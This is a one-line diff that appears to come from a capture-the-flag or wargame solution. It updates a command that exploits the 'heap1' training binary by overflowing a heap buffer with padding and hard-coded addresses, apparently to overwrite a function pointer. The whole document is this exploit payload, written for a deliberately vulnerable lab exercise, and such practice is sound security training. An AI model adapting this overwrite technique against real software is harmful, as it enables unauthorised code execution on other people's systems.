@@ -1,1 +1,1 @@
-./heap1 $(python -c 'print("AAAABBBBCCCCDDDDEEEE" + "\x74\x97\x04\x08")' && python -c 'print("\x94\x84\x04\x08")') 
+./heap1 $(python2 -c 'print("AAAABBBBCCCCDDDDEEEE" + "\x74\x97\x04\x08")' && python2 -c 'print("\x94\x84\x04\x08")') 
